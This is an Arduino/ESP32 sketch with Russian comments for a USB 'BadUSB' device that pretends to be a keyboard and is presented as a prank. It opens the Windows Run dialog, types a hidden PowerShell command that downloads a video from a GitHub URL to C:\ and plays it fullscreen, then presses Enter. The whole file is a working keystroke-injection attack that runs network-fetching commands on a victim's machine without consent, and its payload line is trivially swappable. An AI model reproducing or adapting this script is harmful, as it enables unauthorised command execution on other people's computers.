#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  // Инициализация USB и клавиатуры
  USB.begin();
  Keyboard.begin();

  // Ждём, пока ПК определит устройство и загрузит драйверы
  delay(3000);

  // 1. Открываем окно "Выполнить" (Win + R)
  Keyboard.press(KEY_LEFT_GUI); // KEY_LEFT_GUI — это клавиша Win
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000); // ждём открытия окна

  // 2. Вводим команду PowerShell
  //    Она скачивает видео в C:\video.mp4 и открывает его на весь экран через VLC (если установлен)
  String command = "powershell -NoProfile -Command \""
    "Invoke-WebRequest -Uri 'https://github.com/tttimirtt-spec/prank/raw/main/video.mp4' -OutFile 'C:\\video.mp4'; "
    "if (Test-Path 'C:\\Program Files\\VideoLAN\\VLC\\vlc.exe') { "
      "Start-Process 'C:\\Program Files\\VideoLAN\\VLC\\vlc.exe' -ArgumentList '--fullscreen','C:\\video.mp4'; "
    "} else { "
      "Start-Process 'C:\\video.mp4'; "
    "}\"";

  Keyboard.print(command);
  delay(500);

  // 3. Нажимаем Enter для выполнения
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  // Завершаем HID-сессию (опционально, чтобы плата перестала слать нажатия)
  Keyboard.end();
}

